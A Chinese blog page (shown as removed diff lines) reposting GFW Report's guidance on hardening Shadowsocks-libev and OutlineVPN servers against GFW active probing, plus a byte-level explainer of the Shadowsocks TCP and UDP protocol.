-<p>根据我们的测试和来自开发者的报告，在采用了适当的配置后，以下两个Shadowsocks实现的最新版本已经可以抵御来自GFW的主动探测：<em>Shadowsocks-libev</em>和<em>OutlineVPN</em>。</p>
-</blockquote>
-<h3><span id="针对shadowsocks-libev的使用建议">针对Shadowsocks-libev的使用建议</span></h3><blockquote>
-<p>如果你决定使用Shadowsocks-libev，我们强烈建议你根据这篇教程来<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_tutorial/zh/">部署一台抗封锁的Shadowsocks-libev服务器</a>。我们会时刻更新那篇教程的，以应对之后新出现的针对Shadowsocks的识别和攻击。</p>
-<p>如果你已经拥有了一台Shadowsocks-libev服务器，你可以根据以下规则来确认你的服务器是否配置得可以对抗GFW的主动检测和封锁。</p>
-<p>截止2021年1月，你需要做到以下几点来防止你的<em>Shadowsocks-libev</em>服务器被封锁：</p>
-<ol>
-<li>确保你的服务器版本为<code>v3.3.1</code>及以上。你可以通过以下命令查看服务器的版本<code>ss-server -h</code>。</li>
-<li>使用<a target="_blank" rel="noopener" href="https://shadowsocks.org/en/spec/AEAD-Ciphers.html"><em>AEAD ciphers</em></a>， 而<strong>不用</strong> <em>stream ciphers</em>。换句话说，仅在以下几种加密方式中进行选择：<code>chacha20-ietf-poly1305</code> (推荐), <code>aes-256-gcm</code>, <code>aes-192-gcm</code>或者<code>aes-128-gcm</code>。</li>
-</ol>
-<p>为了缓解针对Shadowsocks的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>，你需要:</p>
-<ol>
-<li>使用一个长的随机密码。这样的密码可以用以下命令在终端生成： <code>openssl rand -base64 16</code>;</li>
-<li>禁用UDP模式。</li>
-</ol>
-<p>注意：针对客户端没有特殊的要求，任何与Shadowsocks-libev服务器兼容的客户端均可。</p>
-</blockquote>
-<h3><span id="针对outlinevpn的使用建议">针对OutlineVPN的使用建议</span></h3><blockquote>
-<p>为了防止你的<a target="_blank" rel="noopener" href="https://getoutline.org/">OutlineVPN</a>服务器被GFW封锁，你需要做到以下几点：</p>
-<ol>
-<li>使用最新版的从<a target="_blank" rel="noopener" href="https://getoutline.org/">官网</a>下载的服务端。</li>
-<li>使用最新版的从<a target="_blank" rel="noopener" href="https://getoutline.org/">官网</a>下载的客户端。</li>
-</ol>
-<p>注意：</p>
-<ol>
-<li>Outline会自动生成一个长的，随机的密码，因此你不必像为Shadowsocks-libev那样手动配置密码。</li>
-<li>Outline服务端会自动更新，因此你不必手动升级服务端。</li>
-<li>Outline只采用<code>chacha20-ietf-poly1305</code>这一种AEAD cipher作为加密方式，因此你不必手动选择加密方式。</li>
-</ol>
-</blockquote>
-<h2><span id="给翻墙软件开发者的建议">给翻墙软件开发者的建议</span></h2><blockquote>
-<p>下面我们介绍我们发现的GFW的最新审查能力，并附上我们给翻墙软件开发者的相应建议。这些建议不仅对Shadowsocks，而且对其他许多翻墙软件都有用。 我们欢迎你加入我们的讨论，分享你的想法，评论，疑惑和关切。</p>
-</blockquote>
-<h3><span id="正确的校验">正确的校验</span></h3><blockquote>
-<p>首先，我们强烈建议翻墙软件的开发者们<strong>彻底</strong>废除不具备校验的加密构造。仅仅有保密性是不够的。</p>
-<ul>
-<li>对于新开发的翻墙软件来说，这意味着根本不应考虑支持不具备校验的加密构造。</li>
-<li>对于现存的翻墙软件来说，这意味着开发者应该勇敢地<strong>移除</strong>所有与不具备教研的加密构造相关的代码，即使以不向下兼容为代价。</li>
-</ul>
-<p>我们这看似大胆的建议实际上出于合理的原因。如我们在<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=7">论文</a>中所介绍的， 一些类型的GFW主动探测会利用Shadowsocks的stream ciphers的malleability。这已经不是第一次不具备校验的加密结构造成漏洞了。事实上，不具备校验的加密结构是许多Shadowsocks和其他翻墙软漏洞的根本来源。</p>
-<p>早在2015年8月，BreakWa11<a target="_blank" rel="noopener" href="https://web.archive.org/web/20160829052958/https://github.com/breakwa11/shadowsocks-rss/issues/38">发现了</a>一个关于Shadowsocks的stream ciphers的漏洞。这个漏洞是由于缺乏数据完整性保护而造成的（<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/traffic-obf/CWO0peBJLGc/Py-clLSTBwAJ">英文总结</a>）。 在2020年，类似的漏洞又被<a target="_blank" rel="noopener" href="https://github.com/v2ray/v2ray-core/issues/2523">发现</a>存在于V2Ray中（<a target="_blank" rel="noopener" href="https://gfw.report/blog/v2ray_weaknesses/zh/">总结</a>）。</p>
-<p>当Shadowsocks开发者试图引入<code>one time auth</code>模式来缓解2015年的那个漏洞时，另一个因数据长度缺乏完整性保护的主动探测又被<a target="_blank" rel="noopener" href="https://web.archive.org/web/20191002190325/https://printempw.github.io/why-do-shadowsocks-deprecate-ota/">引入了</a>（<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/traffic-obf/CWO0peBJLGc/Py-clLSTBwAJ">英文总计</a>）。</p>
-<p>2020年2月，Zhejiang Peng<a target="_blank" rel="noopener" href="https://github.com/edwardz246003/shadowsocks">发现了</a>一个关于Shadowsocks stream ciphers的灾难性的漏洞，(<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/24">英文总结</a>）。 利用使用了stream cipher的Shadowsocks服务器作为decryption oracle，攻击者可以在不需要密码的情况下，完全解密Shadowsocks会话。</p>
-<p>其实早在2017年2月，AEAD ciphers就已经成为了Shadowsocks协议的一部分。而校验问题也理应在那时就被解决了。但实际情况是，截止2021年，大量的服务器仍然因为使用被废弃的stream ciphers而存在着安全隐私漏洞，以及被准确识别的风险。</p>
-<p>这样的现象表明，在实际操作中，许多的用户不能够正确的选择加密方式。这可能与使用过时的教程或一键脚本有关。 我们因此鼓励开发者从Shadowsocks各实现中彻底移除stream ciphers，帮助用户做出正确的选择。</p>
-</blockquote>
-<h3><span id="使用同时基于nonces和时间的重放过滤器">使用同时基于nonces和时间的重放过滤器</span></h3><blockquote>
-<p>我们建议翻墙软件的开发者们采用同时基于nonces和时间的重放过滤器。 因为采用基于时间的重放过滤器需要对Shadowsocks协议进行根本性地变动，我们建议开发者至少要此采用基于nonces的过滤器，并且做到：</p>
-<ol>
-<li>要么建议用户在每次过滤器重置后修改密码；</li>
-<li>要么开发一个机制，可以让重放过滤器在软件重启后依然记得之前的nonces。</li>
-</ol>
-<p>这些建议是基于以下的研究发现和推论。 如<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=5">论文的section 3.5</a>所介绍的， GFW既可以在观察到一个合法连接的瞬间对其进行重放；也可以等待三周甚至更长时间后才重放。 因此，一个更加合理的主动探测模型应该允许审查者在任意时长后对合法连接进行重放。</p>
-<p>这样的一个主动探测模型揭示了纯粹基于nonces的重放过滤所须要面对的不对称性。GFW仅用少量资源就可以记录<strong>一些</strong>合法的连接，并且在经过任意的时长后再重放它们；但与此同时，Shadowsocks需要大量的资源和相对复杂的实现来永久性地记住<strong>所有的</strong>合法链接，直至密码被更换。 注意，Shadowsocks服务器必须在重启后还记住这些nonces；否则重放过滤器不会过滤基于重启前的合法连接的重放。</p>
-<p>幸运的是，这个不公平的局面可以通过同时引入基于时间的重放过滤机制来扭转：服务器只需要处理并验证时间戳未过期的连接，<a target="_blank" rel="noopener" href="https://gfw.report/blog/v2ray_weaknesses/en/">就像VMess服务器那样</a>。 如此一来服务器就不需要永久性地记住所有合法连接中的nonces。</p>
-<p>我们还想强调，对于那些仅仅短暂暴露变化的监听端口的翻墙服务器，重放过滤仍是必要的。因为GFW可以瞬时重放合法连接中的第一个数据包，而这时暴露的监听端口因为未完成数据传输，依然是开启的。</p>
-</blockquote>
-<h3><span id="让服务器的反应保持一致">让服务器的反应保持一致</span></h3><blockquote>
-<p>我们建议开发者们确保翻墙服务器在正常运行时，和遇到不合法的连接时都反应一致。理想情况下，可以按照<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=12">Frolov et al.</a>的建议，让服务器遇到错误连接时“read forever”。 这是因为，审查者会故意触发协议的边边角角等特殊情况，来识别服务器指纹。</p>
-<p>除了我们在Shadowsocks-libev和OutlineVPN中发现的服务器反应指纹，<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=11">Frolov et al.</a>还展示了包括Shadowsocks-python和OutlineVPN在内的多种翻墙软件可以通过关闭连接时的TCP flags和连接时长来识别。studentmain<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/22#issuecomment-744704701">报告</a>，直至2020年12月， 许多的Shadowsocks实现仍存在着我们在Shadowsocks-libev和Outline中发现的问题。</p>
-<p>Frolov et al.建议代理服务器在遇到错误连接时不要立即关闭连接，而是“read forever”。这样做不但避免泄漏超时值，而且使得服务器发送与正常连接关闭时相同的TCP flags来关闭错误连接。</p>
-<p>进一步说，“reading forever”本身不会带来更加独特的指纹。因为Frolov et al.发现<a target="_blank" rel="noopener" href="https://censorbib.nymity.ch/pdf/Frolov2020a.pdf#page=12">互联网上大量的服务器都会有无限超时值（“infinite timeout”）的特征</a>。David Fifield<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/26#issuecomment-599712288">调查</a>显示，许多流行的翻墙软件已经采取了“read forever”策略。这些软件包括OSSH，obfs4，Outline和Lampshade。</p>
-</blockquote>
-<h3><span id="强制采用强密码">强制采用强密码</span></h3><blockquote>
-<p>Len et al. 于2020年展示了针对Shadowsocks服务器的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>。利用在Shadowsocks中使用的non-committing AEAD，攻击者可以更高效地猜出密码。我们因此建议开发者强制采用强密码。一种可能的实现方式是要求用户密码的熵高于一定值。</p>
-</blockquote>
-<h3><span id="主动探测你的实现">主动探测你的实现</span></h3><blockquote>
-<p>如果你是一个不同于Shadowsocks-libev和Outline的翻墙软件开发者或贡献者，我们鼓励你检查同样的漏洞是否也存在于你的Shadowsocks实现中。我们开源了我们在<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf#page=8">论文Section 5.1</a>中用到的<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/code/prober_simulator/">prober 模拟器</a>。</p>
-</blockquote>
-<h2><span id="鸣谢">鸣谢</span></h2><blockquote>
-<p>我们想要感谢来自Jigsaw的Vinicius Fortuna，来自APNIC的Robert Mitchell和Dan Fidler，以及来自Qv2ray的DuckSoft和Student Main对本文提供的反馈。</p>
-</blockquote>
-<h2><span id="联系">联系</span></h2><blockquote>
-<p>这篇报告首发于<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">GFW Report</a>。我们还在APNIC blog，<a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/58">net4people</a>以及<a target="_blank" rel="noopener" href="https://ntc.party/t/a-practical-guide-to-defend-against-the-gfws-latest-active-probing/847">ntc.party</a>同步更新了博文。</p>
-<p>我们鼓励您或公开地或私下地分享您的评论或疑问。我们私下的联系方式可见<a target="_blank" rel="noopener" href="https://gfw.report/">GFW Report</a>的页脚。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/29/Shadowsocks-UDP/">
-                Shadowsocks协议解析
-            </a>
-        </h2>
-    
-    <time>
-        Jan 29, 2024
-    </time>
-    <section class="content">
-        <h1><span id="shadowsocks协议解析">Shadowsocks协议解析</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.ichenxiaoyu.com/ss/">喂草</a> 并作补充</p>
-</blockquote>
-<h2><span id="shadowsocks过程">Shadowsocks过程</span></h2><blockquote>
-<p>Shadowsocks是一个代理协议，以下简称SS。当然基于SS协议催生出了许多的代理软件，例如Shadowsocks-NG（MacOS平台）、Shadowrocket（iOS平台）等。不过总归来说SS的流程是一致的：</p>
-<p><img src="/2024/01/29/Shadowsocks-UDP/1.png" alt="image"></p>
-<p>上图简述了SS在整个数据传输中的位置，包含了SS客户端和SS服务端两个部分，一般来说SS客户端是安装在本地的软件，而SS服务端则是运行在VPS上的软件。如果没有SS的话，上图就成了没有代理的用户与目标服务器（例如Google.com）的直接通信。下面一SS代理下的HTTP请求介绍上述过程：</p>
-<ol>
-<li>浏览器要访问Google.com，便生成HTTP请求。由于设置了代理，所以不会直接发送到Google服务器，而是发送到SS客户端（例如127.0.0.1:1086）。</li>
-<li>SS客户端把HTTP请求封装成<strong>SS请求</strong>（后面详细介绍），包含协议封装和加密过程，发送给SS服务器。</li>
-<li>SS服务器收到SS请求并解析，包含解密和协议解析过程，获得原始HTTP请求。</li>
-<li>SS服务器连接Google服务器，发送用户的原始HTTP请求，并获取Google返回的HTTP响应。</li>
-<li>SS服务器对HTTP请求进行加密，并发送到SS客户端。此处没有协议封装。</li>
-<li>SS客户端收到SS服务器的响应，进行数据解密得到HTTP响应，发送到浏览器以完成HTTP请求。</li>
-</ol>
-</blockquote>
-<h2><span id="shadowsocks协议">Shadowsocks协议</span></h2><blockquote>
-<p>接下来会在<strong>字节层面</strong>对上述过程进行详细介绍。由于SS在处理TCP连接和UDP报文所使用的协议有所差异，因此也会分开介绍。</p>
-</blockquote>
-<h3><span id="tcp连接">TCP连接</span></h3><blockquote>
-<p>TCP连接模式主要包括HTTP、HTTPS和Socket等应用层协议，这些协议有所差异比如说有的协议有握手，有的协议却只有一来一回的数据交互，有的协议可能会保持长时间的连接和数据传输。。但这些对于SS来说都是一样的，因为它们都不过是<strong>数据</strong>（payload），而SS要做的无非是<strong>创建两个通道，一个用于把客户端数据传输到服务端，一个用于把服务端的数据传输到客户端</strong>。</p>
-</blockquote>
-<h4><span id="ss请求">SS请求</span></h4><blockquote>
-<p>TCP握手很熟悉了，握手的目的是建立数据链路。SS也有握手过程，目的就是建立上述的数据链路，不过这个过程只有<strong>半次握手</strong>，即SS请求。SS请求的主要功能是建立代理链路，因此需要告诉SS服务器要代理访问的远程服务器地址（如果不知道IP地址的话，给域名也可以），然后可以顺便携带一部分传输数据。根据地址类型的不同，SS请求会有3种形式：</p>
-<ol>
-<li>通过SS请求传输目标服务器的IPv4地址：</li>
-</ol>
-<p><img src="/2024/01/29/Shadowsocks-UDP/2.png" alt="image"></p>
-<ol start="2">
-<li>通过SS请求传输目标服务器的IPv6地址：</li>
-</ol>
-<p><img src="/2024/01/29/Shadowsocks-UDP/3.png" alt="image"></p>
-<ol start="3">
-<li>在不知道目标服务器IP地址的时候（比如DNS被劫持），直接传输目标服务器的域名：</li>
-</ol>
-<p><img src="/2024/01/29/Shadowsocks-UDP/4.png" alt="image"></p>
-</blockquote>
-<h4><span id="客户端加密">客户端加密</span></h4><blockquote>
-<p>SS客户端把SS请求组装好了，在向SS服务器传输之前还需要进行加密，否则用户的数据就在网络上明文传输了，这个是很不安全的。下面举例使用SS中最常用的加密方案AES-256-cfb方式进行数据加密，大致步骤如下：</p>
-<ol>
-<li><strong>密钥生成</strong>：AES-256意味着其密钥长度是256bit，但用户密码有长有短，而且都是可见的ASCII，把密码作为密钥来用显然安全性是不够的，所以需要<strong>根据密码生成安全性达标的256bit长度密钥</strong>。SS中使用MD5对密码生成16byte长度的消息摘要，即可作为密钥使用。</li>
-<li><strong>IV生成</strong>：原始AES加密下，对于相同的明文会生成相同的密文，这也是安全性的一种缺陷。AES-cfb通过引入随机数IV的方式解决该问题，即在随机数IV的加持之下可以实现相同的明文生成不同的密文。在AES-256-cfb中，IV是一个16bit的随机数。</li>
-<li><strong>加密</strong>：有了密钥、加密算法、IV，就可以生成加密器，并对数据进行加密了。在此数据就是上述所组装的SS请求，得到密文cypher。为了让SS服务端可以解密，还需要把IV也一同发送，所以最终生成的数据如下：</li>
-</ol>
-<p><img src="/2024/01/29/Shadowsocks-UDP/5.png" alt="image"></p>
-</blockquote>
-<h4><span id="服务端解析">服务端解析</span></h4><blockquote>
-<p>SS服务器和SS客户端所共享的信息有密码和加密方式，这是配置过SS服务器的人都知道的，在收到SS客户端发送的SS请求后，SS客户端进行解析的过程如下：</p>
-<ol>
-<li><strong>密钥生成</strong>：根据密码生成密钥，由于和客户端拥有相同的密码和密钥生成算法，所以生成的AES-256-cfb密钥也是一样的。</li>
-<li><strong>获取IV</strong>：从SS客户端接收到的数据前16bit提取出来就得到了AES-256-cfb的IV。</li>
-<li><strong>解密</strong>：根据密钥、加密算法和IV生成解密器，对收到的数据进行解密，就得到了SS请求明文。</li>
-<li><strong>地址解析</strong>：根据SS请求的第1个Byte得知目标服务器地址的类型（IPv4，IPv6或域名），并根据相应的规则进行解析得到其地址与端口。</li>
-<li><strong>代理请求</strong>：说到底SS就是一个代理协议，代理的意思就是<strong>代替客户端对目标服务器发起请求</strong>。通过地址与端口连接目标服务器，并发送解密后的数据，完成请求。</li>
-</ol>
-</blockquote>
-<h4><span id="服务端响应">服务端响应</span></h4><blockquote>
-<p>SS服务器收到目标服务器的数据，把数据传输给SS客户端，也需要进行加密，不同的是<strong>不需要组装协议了</strong>。所以该过程就比较简单：</p>
-<ol>
-<li><strong>生成IV</strong>：虽然也是随机数，但该IV与SS客户端发送请求时生成的IV不相等，需要再生成一个。</li>
-<li><strong>加密</strong>：根据新生成的IV、密钥和加密算法生成加密器，对目标服务器响应的数据进行加密。同样为了SS客户端可以解密，也需要把IV连同密文一起发送给客户端。</li>
-</ol>
-</blockquote>
-<h4><span id="客户端解析">客户端解析</span></h4><blockquote>
-<p>SS客户端收到服务端的数据，通过提取IV就可以生成响应的解密器，对数据进行解密，从而完成用户与目标服务器的通信。<br>上述的加密器和解密器都是和连接绑定的，即一次TCP连接代理通信只需要互相发送一次IV用于双方创建解密器，而后续的通信内容都只有包括密文部分，使用解密器进行解密即可。<br>所以其实SS协议的过程是非常简单的，以至于在画下图的时候都不知道有什么可以加上的东西。</p>
-<p><img src="/2024/01/29/Shadowsocks-UDP/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="udp连接">UDP连接</span></h3><blockquote>
-<p>UDP模式在SS中通过<strong>UDP转发</strong>选项开启，用于代理UDP流量如DNS查询、即时语音通信等。</p>
-</blockquote>
-<h4><span id="udp模式和tcp模式差异">UDP模式和TCP模式差异</span></h4><blockquote>
-<p>SS中TCP和UDP大同小异，但由于UDP之于TCP是<strong>无连接协议</strong>，因此简单探讨一下UDP模式无连接下的一些区别：</p>
-<ol>
-<li><strong>TCP连接作为基本单位</strong>：在TCP模式中，从握手到挥手的过程就是一次连接，因此一次连接是SS中的基本单位，所以一次连接对应上下行的2个加密通道、2个IV。所以一次TCP连接中无论有多少次数据交互，<strong>只需要一次握手</strong>。</li>
-<li><strong>UDP数据分组作为基本单位</strong>：在UDP模式中没有连接的概念，其基本单位是每个数据包，所以<strong>每个数据包对应1个IV和加密解密器</strong>。可以说在UDP模式下有多少个数据包，就会发生多少次SS握手。</li>
-<li><strong>连接方式差异</strong>：因为UDP是无连接，所以在socket编程时通常不会像UDP连接一样，先connect然后才数据读写，而是直接进行数据包的收发。</li>
-<li><strong>方向性</strong>：TCP模式种中总是SS客户端向SS服务器发起握手，但在UDP模式中由于没有连接的概念，所以每个数据包都是平等的自带握手信息，即使SS服务器向SS客户端发送的数据也是。</li>
-</ol>
-</blockquote>
-<h4><span id="udp下的握手协议">UDP下的握手协议</span></h4><blockquote>
-<p>UDP模式中<strong>每一个数据包都具有相同格式</strong>，无论是从SS客户端发往SS服务器，还是从SS服务器发往SS客户端，其格式与上述<strong>SS请求</strong>相同：</p>
-<p><img src="/2024/01/29/Shadowsocks-UDP/7.png" alt="image"></p>
-<p>所以不仅SS客户端会把需要代理访问的目标服务器的地址信息告诉SS服务器，SS服务器也会把目标服务器返回的数据连同其地址信息一同返回SS客户端。这主要是因为UDP模式下是没有连接的概念，所以每条数据需要自带一些额外信息，就像每次进商场都要戴口罩测体温一样。</p>
-</blockquote>
-<h2><span id="后记">后记</span></h2><blockquote>
-<p> 学术交流而已。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a>
             </div>
         
 
